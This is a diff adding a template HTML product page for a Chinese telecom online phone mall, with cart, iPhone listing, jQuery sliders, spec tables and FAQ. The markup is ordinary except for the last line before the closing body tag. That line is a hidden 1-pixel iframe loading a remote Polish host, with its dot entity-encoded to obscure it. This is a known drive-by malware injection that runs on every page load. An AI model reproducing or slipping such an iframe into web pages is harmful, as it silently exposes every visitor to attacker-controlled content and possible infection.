@@ -1,0 +1,671 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <title>无标题文档</title>
+    <link href="style/public.css" rel="stylesheet" type="text/css" />
+    <link href="style/detail.css" rel="stylesheet" type="text/css" />
+    <link href="style/you_like.css" rel="stylesheet" type="text/css" />
+    <link href="style/jqzoom.css" rel="stylesheet" type="text/css" />
+    <script type="text/javascript" src="script/jquery-1.3.2.min.js"></script>
+    <script type="text/javascript" src="script/html5.js"></script>
+    <script type="text/javascript" src="script/jqzoom.js"></script>
+</head>
+<body>
+<!--header-->
+<header class="header">
+    <!--topBar-->
+    <div class="topBar">
+        <div class="layout">
+            <!--welcome-->
+            <span class="topBar-userWelcome">您好，欢迎来中国电信翼猫商城！<a href="#">[登录]</a> <a href="#">[注册]</a></span>
+            <!--登录后
+            <span class="topBar-userWelcome logined">
+              欢迎您
+              <span class="user">
+                <a href="#" class="user-link">fanyanxia<em class="icon-arr"></em></a>
+                <span class="user-cs" style="display:none;">
+                  <span class="user-cs-con">
+                    <s class="icon-arr"></s>
+                    <p><a href="#">个人中心</a></p>
+                    <p><a href="#">退出登录</a></p>
+                  </span>
+                </span>
+              </span>
+              |
+            </span>
+            <script>
+              $(function(){
+                $(".user").hover(function(){
+                  $(this).find(".user-cs").show();
+                },function(){
+                  $(this).find(".user-cs").hide();
+                });
+              });
+            </script>
+            -->
+            <!--//welcome-->
+            <!--topBar-menu-->
+            <span class="topBar-menu">
+        <a href="#">商户入驻申请</a>|
+        <a href="#">我的订单</a>|
+        <a href="#">网上营业厅</a>
+      </span>
+            <!--//topBar-menu-->
+        </div>
+    </div>
+    <!--//topBar-->
+    <!--headerMain-->
+    <div class="headerMain layout clearfix">
+        <!--logo-->
+        <h1 class="siteLogo"><a href="#" title="中国电信" class="siteLogo-homepage"></a><a href="#" title="翼猫商城" class="siteLogo-mallpage"></a></h1>
+        <!--//logo-->
+        <!--search-->
+        <div class="search">
+            <div class="search-area">
+                <input type="text" placeholder="请输入搜索关键字" class="search-input-text" />
+                <input type="button" title="搜索" class="search-input-submit">
+                <div class="search-suggest" style="display:none;">
+                    <ol>
+                        <li class="search-suggest-key">三星<b>I9500</b></li>
+                        <li class="search-suggest-key">三星<b>I9501</b></li>
+                        <li class="search-suggest-key">三星<b>I9001</b></li>
+                        <li class="search-suggest-key">三星<b>I9505</b></li>
+                        <li class="search-suggest-key">三星<b>I9503</b></li>
+                    </ol>
+                </div>
+            </div>
+            <p class="search-hotkey">热门搜索：<a href="#">三星手机</a><a href="#">手机套</a><a href="#">手机电源线</a></p>
+        </div>
+        <!--//search-->
+        <!--我的翼猫-->
+        <div class="myYmall">
+            <em class="icon-user"></em><a href="#">我的翼猫</a>
+        </div>
+        <!--//我的翼猫-->
+        <!--去购物车结算-->
+        <div class="to-cart">
+            <dl>
+                <dt>
+                    <span class="shop-amount">0</span>
+                    <em class="icon-cart"></em>
+                    <a href="#">去购物车结算</a>
+                    <span class="angle"></span>
+                </dt>
+                <dd style="display:none;">
+                    <!--购物车为空-->
+                    <div class="nogoods" style="display:none;">
+                        购物车中还没有商品，赶紧选购吧！
+                    </div>
+                    <!--//购物车为空-->
+                    <!--有商品-->
+                    <div class="cart-table">
+                        <div class="cart-table-body">
+                            <ul class="cart-item clearfix">
+                                <li class="item-img"><a href="#"><img src="picture/small_55x55.jpg" /></a></li>
+                                <li class="item-intro"><a href="#">三星手机NNOTOS9S</a></li>
+                                <li class="item-extra"><em class="item-price">￥<span>799</span></em>x<span>2</span><p><a href="#" class="delete">删除</a></p></li>
+                            </ul>
+                            <ul class="cart-item clearfix">
+                                <li class="item-img"><a href="#"><img src="picture/small_55x55.jpg"></a></li>
+                                <li class="item-intro"><a href="#">三星手机NNOTOS9S</a></li>
+                                <li class="item-extra"><em class="item-price">￥<span>799</span></em>x<span>2</span><p><a href="#" class="delete">删除</a></p></li>
+                            </ul>
+                            <ul class="cart-item clearfix">
+                                <li class="item-img"><a href="#"><img src="picture/small_55x55.jpg"></a></li>
+                                <li class="item-intro"><a href="#">三星手机NNOTOS9S</a></li>
+                                <li class="item-extra"><em class="item-price">￥<span>799</span></em>x<span>2</span><p><a href="#" class="delete">删除</a></p></li>
+                            </ul>
+                        </div>
+                        <div class="cart-info">
+                            <div class="cart-bottom">
+                                <p>
+                                    共<span class="f-red2">2</span>件商品，共计<em class="item-price">￥<span>5399</span></em>
+                                    <br />
+                                    <a href="#" class="cart-goMyCart btn btn-red">去购物车结算</a>
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                    <!--//有商品-->
+                </dd>
+            </dl>
+        </div>
+        <!--//去购物车结算-->
+        <script>
+            $(function(){
+                $(".to-cart").hover(function(){
+                    $(this).find(".angle").addClass("down").end().find("dt").addClass("selected").end().find("dd").show();
+                },function(){
+                    $(this).find(".angle").removeClass("down").end().find("dt").removeClass("selected").end().find("dd").hide();
+                });
+                if($(".cart-table .cart-item").size()>2){
+                    $(".cart-table .cart-table-body").css("overflow-y","auto");
+                }
+            });
+        </script>
+    </div>
+    <!--//headerMain-->
+    <!--headerNav-->
+    <div class="headerNav">
+        <div class="layout">
+            <dl class="all-brands">
+                <dt class="all-brands-head">
+                    <a href="#">全部商品分类</a>
+                </dt>
+                <dd class="all-brands-list" style="display:none;">
+                    <div class="all-brands-item">
+                        <h3>合约购机<i>NEW</i></h3>
+                        <p>
+                            <a href="#">三星</a>
+                            <a href="#">Iphone</a>
+                            <a href="#">小米</a>
+                        </p>
+                        <a href="#" class="more">更多</a>
+                    </div>
+                    <div class="all-brands-item">
+                        <h3>手机套<em>91折起</em></h3>
+                        <p>
+                            <a href="#">银联充值</a>
+                            <a href="#">易充值</a>
+                        </p>
+                        <a href="#" class="more">更多</a>
+                    </div>
+                    <div class="all-brands-item">
+                        <h3>手机配件</h3>
+                        <p>
+                            <a href="#">2000元起</a>
+                            <a href="#">3000元起</a>
+                        </p>
+                        <a href="#" class="more">更多</a>
+                    </div>
+                    <div class="all-brands-item">
+                        <h3>杯子照片<em>91折起</em></h3>
+                        <p>
+                            <a href="#">银联充值</a>
+                            <a href="#">易充值</a>
+                        </p>
+                        <a href="#" class="more">更多</a>
+                    </div>
+                    <div class="all-brands-item">
+                        <h3>优惠促销</h3>
+                        <p>
+                            <a href="#">话费服务</a>
+                            <a href="#">话费服务</a>
+                        </p>
+                        <a href="#" class="more">更多</a>
+                    </div>
+                </dd>
+            </dl>
+            <script>
+                <!--商品分类显示隐藏-->
+                $(function(){
+                    $(".all-brands").hover(
+                        function(){
+                            $(this).find(".all-brands-list").show();
+                        },function(){
+                            $(this).find(".all-brands-list").hide();
+                        });
+                });
+            </script>
+            <div class="headerNav-main clearfix">
+                <!--headerNav-nav-->
+                <nav class="headerNav-nav">
+                    <ul class="clearfix">
+                        <li><a href="#" class="selected">首页</a></li>
+                        <li><a href="#">手机汇</a></li>
+                        <li><a href="#">聚优惠</a></li>
+                        <li><a href="#">商业街</a></li>
+                    </ul>
+                </nav>
+                <!--//headerNav-nav-->
+            </div>
+        </div>
+    </div>
+    <!--//headerNav-->
+</header>
+<!--//header-->
+<!--container-->
+<div class="container">
+    <div class="layout m10-b">
+        <!--面包屑-->
+        <div class="breadcrumb">
+            <a href="#">首页</a> &gt; <a href="#">商品一级分类名称</a> &gt; <a href="#">商品二级分类名称</a> &gt; 商品名称
+        </div>
+        <!--//面包屑-->
+        <div class="product-intro clearfix">
+            <!--商品展示-->
+            <div class="product-info-img">
+                <!--图片展示-->
+                <div class="img-wrap">
+                    <div class="img-big">
+                        <a href="picture/img_big.jpg" ><img width="486" height="350" src="picture/img_small_486x350.jpg" /></a>
+                    </div>
+                    <div class="img-big">
+                        <a href="picture/img_big.jpg" ><img width="486" height="350" src="picture/img_small_486x350.jpg" /></a>
+                    </div>
+                    <div class="img-big">
+                        <a href="picture/img_big.jpg" ><img width="486" height="350" src="picture/img_small_486x350.jpg" /></a>
+                    </div>
+                    <div class="img-big">
+                        <a href="picture/img_big.jpg" ><img width="486" height="350" src="picture/img_small_486x350.jpg" /></a>
+                    </div>
+                    <div class="img-big">
+                        <a href="picture/img_big.jpg" ><img width="486" height="350" src="picture/img_small_486x350.jpg" /></a>
+                    </div>
+                    <div class="img-big">
+                        <a href="picture/img_big.jpg" ><img width="486" height="350" src="picture/img_small_486x350.jpg" /></a>
+                    </div>
+                    <div class="img-big">
+                        <a href="picture/img_big.jpg" ><img width="486" height="350" src="picture/img_small_486x350.jpg" /></a>
+                    </div>
+                    <div class="img-big">
+                        <a href="picture/img_big.jpg" ><img width="486" height="350" src="picture/img_small_486x350.jpg" /></a>
+                    </div>
+                </div>
+                <!--//图片展示-->
+                <!--图片按钮-->
+                <div class="spec-lists">
+                    <div class="spec-items">
+                        <ul class="clearfix" id="slider">
+                            <li class="selected"><span><img src="picture/img_btn_52x52.jpg"></span></li>
+                            <li><span><img src="picture/img_btn_52x52.jpg" /></span></li>
+                            <li><span><img src="picture/img_btn_52x52.jpg" /></span></li>
+                            <li><span><img src="picture/img_btn_52x52.jpg" /></span></li>
+                            <li><span><img src="picture/img_btn_52x52.jpg" /></span></li>
+                            <li><span><img src="picture/img_btn_52x52.jpg" /></span></li>
+                            <li><span><img src="picture/img_btn_52x52.jpg" /></span></li>
+                            <li><span><img src="picture/img_btn_52x52.jpg" /></span></li>
+                        </ul>
+                    </div>
+                </div>
+                <!--//图片按钮-->
+                <div class="share-sns clearfix">
+                    <span>分享到：</span>
+                    <a href="#"><img src="images/shareIcon-weibo.png" /></a>
+                    <a href="#"><img src="images/shareIcon-tencent.png" /></a>
+                    <a href="#"><img src="images/shareIcon-renren.png" /></a>
+                    <a href="#"><img src="images/shareIcon-qzone.png" /></a>
+                    <a href="#"><img src="images/shareIcon-sohu.png" /></a>
+                    <a href="#"><img src="images/shareIcon-more.png" /></a>
+                </div>
+            </div>
+            <script type="text/javascript" src="script/jquery.bxSlider.min.js"></script>
+            <script type="text/javascript">
+                $(function(){
+                    $(".img-wrap .img-big").eq(0).show().siblings().hide();
+                    $(".spec-items li").hover(function(){
+                        var img_index=$(".spec-items li").index(this);
+                        var big_index=img_index-1;
+                        $(this).addClass("selected").siblings().removeClass("selected");
+                        $(".img-wrap .img-big").eq(big_index).show().siblings().hide();
+                    });
+                });
+
+                //jqzoom
+                $('.img-wrap a').jqzoom({
+                    zoomType: 'standard',
+                    alwaysOn : false,
+                    zoomWidth: 300,
+                    zoomHeight:300,
+                    position:'left',
+                    xOffset: 10,
+                    yOffset: 0,
+                    showEffect : 'fadein',
+                    hideEffect: 'fadeout'
+                });
+
+                $(document).ready(function(){
+                    $('#slider').bxSlider({
+                        auto:false , //false true
+                        displaySlideQty: 5, //显示数 量
+                        moveSlideQty:1, //切换数量
+                        infiniteLoop:false,
+                        showNum:5
+                        //hideControlOnEnd:true
+                        //startingSlide:5
+                        //prevSelector: 'left',
+                        //nextSelector: 'right',
+                    })
+                });
+            </script>
+            <!--商品展示-->
+            <!--商品说明右侧 开始-->
+            <div class="fl-l product_property">
+                <!--属性-->
+                <div class="pro_meta">
+                    <ul class="clearfix">
+                        <li class="name border-b">
+                            <span>苹果（APPLE）iPhone 5s 16G版 3G手机（金色）WCDMA/GSM</span> <span class="span01">商品卖点显示在商品名称之后字体字
+号粗细同商品名称，字体颜色为红色。卖点最多为50个字符。每行最多显示50字符，超出换行。</span>
+                        </li>
+                        <li>
+                            <span class="sp_l">商&nbsp;城&nbsp;价：</span>
+                            <div class="fl-l">
+                                <del>¥4999</del>
+                            </div>
+                        </li>
+                        <li>
+                            <span class="sp_l">活&nbsp;动&nbsp;价：</span>
+                            <div class="fl-l">
+                                <strong><em class="tb-rmb-num">¥3558</em></strong>
+                            </div>
+                        </li>
+                        <li>
+                            <span class="sp_l">促销信息：</span>
+                            <div class="fl-l">
+                                <span class="span02">促销优惠</span> <em class="em01">天翼专享优惠促销</em> <a class="to-detail" href="#">详情说明</a>
+                            </div>
+                        </li>
+                        <li>
+                            <span class="sp_l">可选颜色：</span>
+                            <div class="fl-l action-bate">
+                                <a class="selected">黑色<em></em></a><a>白色<em></em></a>
+                            </div>
+                        </li>
+                        <li>
+                            <span class="sp_l">选择容量：</span>
+                            <div class="fl-l action-bate">
+                                <a class="selected">16G<em></em></a><a>32G<em></em></a>
+                            </div>
+                        </li>
+                        <li>
+                            <span class="sp_l">购买方式：</span>
+                            <div class="fl-l action-bate">
+                                <a>裸机<em></em></a><a class="selected">合约<em></em></a>
+                            </div>
+                        </li>
+                        <li>
+                            <span class="sp_l">库　　存：</span>
+                            <div class="fl-l">
+                                <span>现货</span>
+                            </div>
+                        </li>
+                    </ul>
+                </div>
+                <!--属性-->
+                <!--phone_key-->
+                <dl class="phone_num clearfix">
+                    <dt class="fl-l">购买数量：</dt>
+                    <dd class="fl-l">
+            <span class="tb_stock">
+              <a href="#" class="tb_reduce">-</a>
+		      <input type="text" value="1" id="buynum">
+			  <a href="#" class="tb_increase">+</a>
+            </span>
+                    </dd>
+                </dl>
+                <!--phone_key-->
+                <!--已选择-->
+                <div class="phone_choosed">
+                    <span>此商品由　<a href="#" class="f-big f-orange1">上海万虎光大通信设备有限公司</a>　负责销售及发货</span>
+                    <div class="add_btn"><a href="#" class="btn btn-red">立即购买</a><a href="#" class="btn btn-coffee">加入购物车</a>请移步购物车选择合约套餐</div>
+                </div>
+                <!--已选择-->
+            </div>
+            <!--商品说明右侧 结束-->
+        </div>
+        <!--猜你喜欢-->
+        <div class="you-like">
+            <h3>猜你喜欢</h3>
+            <ul class="you-like-list">
+                <li class="you-like-item">
+                    <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
+                    <p class="item-info">
+                        <a href="#">苹果（APPLE）iPhone 4S 8G版 3G手机（白色）WCDMA/GSM</a>
+                    </p>
+                    <p class="item-price">￥<em>2398</em></p>
+                </li>
+                <li class="you-like-item">
+                    <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
+                    <p class="item-info">
+                        <a href="#">苹果（APPLE）iPhone 4S 8G版 3G手机（白色）WCDMA/GSM</a>
+                    </p>
+                    <p class="item-price">￥<em>2398</em></p>
+                </li>
+                <li class="you-like-item">
+                    <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
+                    <p class="item-info">
+                        <a href="#">苹果（APPLE）iPhone 4S 8G版 3G手机（白色）WCDMA/GSM</a>
+                    </p>
+                    <p class="item-price">￥<em>2398</em></p>
+                </li>
+                <li class="you-like-item">
+                    <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
+                    <p class="item-info">
+                        <a href="#">苹果（APPLE）iPhone 4S 8G版 3G手机（白色）WCDMA/GSM</a>
+                    </p>
+                    <p class="item-price">￥<em>2398</em></p>
+                </li>
+                <li class="you-like-item">
+                    <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
+                    <p class="item-info">
+                        <a href="#">苹果（APPLE）iPhone 4S 8G版 3G手机（白色）WCDMA/GSM</a>
+                    </p>
+                    <p class="item-price">￥<em>2398</em></p>
+                </li>
+                <li class="you-like-item">
+                    <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
+                    <p class="item-info">
+                        <a href="#">苹果（APPLE）iPhone 4S 8G版 3G手机（白色）WCDMA/GSM</a>
+                    </p>
+                    <p class="item-price">￥<em>2398</em></p>
+                </li>
+            </ul>
+        </div>
+        <!--//猜你喜欢-->
+        <!--右侧详情-->
+        <div class="product-detail fl-r">
+            <!--随心配-->
+            <div class="bundle clearfix m10-b">
+                <h3 class="bundle-head">
+                    <span>随心配</span>
+                    <a href="#" class="more">进入配件选购中心&gt;&gt;</a>
+                </h3>
+                <div class="bundle-data">
+                    <div class="bundle-list">
+                        <ul id="bundleSlider">
+                            <li class="bundle-item">
+                                <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
+                                <p class="item-info"><a href="#">苹果（APPLE）iPhone 5s 16G版 3G</a></p>
+                                <p class="item-price"><input type="checkbox" />￥<em>4898</em></p>
+                            </li>
+                            <li class="bundle-item">
+                                <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
+                                <p class="item-info"><a href="#">苹果（APPLE）iPhone 5s 16G版 3G</a></p>
+                                <p class="item-price"><input type="checkbox" />￥<em>4898</em></p>
+                            </li>
+                            <li class="bundle-item">
+                                <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
+                                <p class="item-info"><a href="#">苹果（APPLE）iPhone 5s 16G版 3G</a></p>
+                                <p class="item-price"><input type="checkbox" />￥<em>4898</em></p>
+                            </li>
+                            <li class="bundle-item">
+                                <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
+                                <p class="item-info"><a href="#">苹果（APPLE）iPhone 5s 16G版 3G</a></p>
+                                <p class="item-price"><input type="checkbox" />￥<em>4898</em></p>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="bundle-extra">
+                        <p>已选择<em>0</em>个配件</p>
+                        <p>商城价格合计：<span class="extra-price">￥<em>4898</em></span></p>
+                        <p class="btn-sku"><a href="#" class="btn btn-coffee">搭配购买</a></p>
+                    </div>
+                </div>
+            </div>
+            <script type="text/javascript" src="script/jquery.bxSlider.min.js"></script>
+            <script type="text/javascript">
+                $(document).ready(function(){
+                    $('#bundleSlider').bxSlider({
+                        auto:false , //false true
+                        displaySlideQty: 3, //显示数 量
+                        moveSlideQty:1, //切换数量
+                        infiniteLoop:false,
+                        showNum:3
+                        //hideControlOnEnd:true
+                        //startingSlide:5
+                        //prevSelector: 'left',
+                        //nextSelector: 'right',
+                    })
+                });
+            </script>
+            <!--随心配-->
+            <!--tabs-->
+            <div class="tabs detail m10-b">
+                <ul class="cut fixed">
+                    <li class="current">商品详情</li>
+                    <li>规格参数</li>
+                    <li>包装清单</li>
+                    <li>常见问题</li>
+                </ul>
+                <div class="tab detail-main">
+                    <img src="picture/detail.jpg" />
+                </div><!--//商品详情-->
+                <div class="tab detail-main">
+                    <h4>规格参数</h4>
+                    <table>
+                        <tr>
+                            <th>商品名称：</th>
+                            <td>苹果iPhone 5s</td>
+                            <th>品牌：</th>
+                            <td>苹果（Apple）</td>
+                        </tr>
+                        <tr>
+                            <th>上架时间：</th>
+                            <td>2014-01-26 09:06:16</td>
+                            <th>商品编号：</th>
+                            <td>1057746</td>
+                        </tr>
+                        <tr>
+                            <th>系统：</th>
+                            <td>苹果（IOS）</td>
+                            <th>外观设计：</th>
+                            <td>直板</td>
+                        </tr>
+                        <tr>
+                            <th>网络：</th>
+                            <td>联通3G（WCDMA），移动2G/联通2G（GSM），移动3G（TD-SCD）</td>
+                            <th>商品产地：</th>
+                            <td>中国大陆</td>
+                        </tr>
+                    </table>
+                </div><!--//规格参数-->
+                <div class="tab detail-main">
+                    <h4>包装清单</h4>
+                    <table>
+                        <tr>
+                            <th>电池型号：</th>
+                            <td>内置充电式锂离子电池</td>
+                            <th>电池类型：</th>
+                            <td>锂电池</td>
+                        </tr>
+                        <tr>
+                            <th>数据线：</th>
+                            <td>苹果8pin</td>
+                            <th>耳机：</th>
+                            <td>1057746</td>
+                        </tr>
+                        <tr>
+                            <th>系统：</th>
+                            <td>苹果（IOS）</td>
+                            <th>商品毛重：</th>
+                            <td>3.5mm</td>
+                        </tr>
+                        <tr>
+                            <th>机身尺寸：</th>
+                            <td>高：123.8 毫米 (4.87 英寸) 宽：58.6 毫米 (2.31 英寸) ...</td>
+                            <th>机身重量：</th>
+                            <td>重量：112 克 (3.95 盎司)</td>
+                        </tr>
+                    </table>
+                </div><!--//包装清单-->
+                <div class="tab detail-main">
+                    <div class="aq">
+                        <div class="aq-head">常见问题？</div>
+                        <div class="aq-con">
+                            <dl>
+                                <dt>如何条哦选商品？</dt>
+                                <dd>点击页面上方“加入购物车”按钮或页面下拉时顶部导航上的“加入购物车”按钮将商品加入购物车，再点击页面右上角的“购物车”前往购物车页面进行结算。</dd>
+                                <dt>收藏商品功能</dt>
+                                <dd>点击“收藏按钮”后，按钮中的白心亮起,背景由黑色变为黄色代表收藏成功，再次点击取消收藏。您可在“个人中心”中的我的收藏查看所有收藏商品。</dd>
+                                <dt>维修网点销售配件吗？</dt>
+                                <dd>所有授权维修网点具备维修手机标配里配件的功能，部分指定授权维修网点可销售标配及部分官网配件，具体销售的产品及价格请以修网点信息为准。</dd>
+                                <dt>退换货办理流程</dt>
+                                <dd style="border:0;">您可拨打小米客服中心400-100-5678与客服人员沟通，或登录小米网“我的订单” ->“订单详情”下方点击“申请售后服务”并填写相应信息，小米看到您的申请，会安排工作人员与您进行退换货质量确认并办理相关事宜.</dd>
+                            </dl>
+                        </div>
+                    </div>
+                </div><!--//常见问题-->
+            </div>
+            <script>
+                //商品详情
+                $(function(){
+                    var siteTop = $(".detail .cut").offset().top;
+                    $(window).scroll(function(){
+                        var scrolltop = $(document).scrollTop();
+                        if(scrolltop >= siteTop){
+                            $(".detail .cut").removeClass("fixed");
+                        }else{
+                            $(".detail .cut").addClass("fixed");
+                        }
+                    });
+
+                    $(".detail .cut li").click(function(){
+                        var index = $(".detail .cut li").index(this);
+                        $(this).addClass("current").siblings().removeClass("current");
+                        $("body,html").stop().animate({scrollTop:$(".detail .detail-main").eq(index).offset().top},600);
+                    });
+                });
+            </script>
+            <!--//tabs-->
+        </div>
+        <!--右侧详情-->
+        <div class="c"></div>
+    </div>
+</div>
+<!--//container-->
+<!--footer-->
+<footer class="footer">
+    <div class="layout clearfix">
+        <!--footService-->
+        <div class="footer-service">
+            <dl>
+                <dt><em class="icon-aq"></em>购物指南</dt>
+                <dd><a href="#">咨询与投诉</a></dd>
+            </dl>
+            <dl>
+                <dt><em class="icon-service"></em>售后服务</dt>
+                <dd><a href="#">七天包退</a></dd>
+                <dd><a href="#">十五天包换</a></dd>
+                <dd><a href="#">手机维修咨询</a></dd>
+            </dl>
+            <dl>
+                <dt><em class="icon-pay"></em>支付方式</dt>
+                <dd><a href="#">网上支付</a></dd>
+            </dl>
+        </div>
+        <!--//footService-->
+        <!--在线咨询-->
+        <ul class="online">
+            <li class="line1"><a href="#"></a></li>
+            <li class="line2"><a href="#"></a></li>
+            <li class="line3"><a href="#"></a></li>
+            <li class="line4"><a href="#"></a></li>
+            <li class="line5"><a href="#"></a></li>
+            <li class="line6"><a href="#"></a></li>
+        </ul>
+        <!--在线咨询-->
+    </div>
+    <!--copyright-->
+    <div class="footer-copyright">
+        <p class="footer-nav"><a href="#">关于我们</a> | <a href="#">网厅公告</a> | <a href="#">网站使用帮助</a> | <a href="#">网站导航</a> | <a href="#">业务合作</a> | <a href="#">友情链接</a></p>
+        <p class="copyright">版权所有 ©2009 中国电信集团公司 [ 增值电信业务经营许可证 A2.B1.B2-20090001 ] ICP证号京ICP备 09031924号</p>
+        <s class="cr-icon"></s>
+    </div>
+    <!--//copyright-->
+</footer>
+<!--//footer-->
+<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
+</body>
+</html>
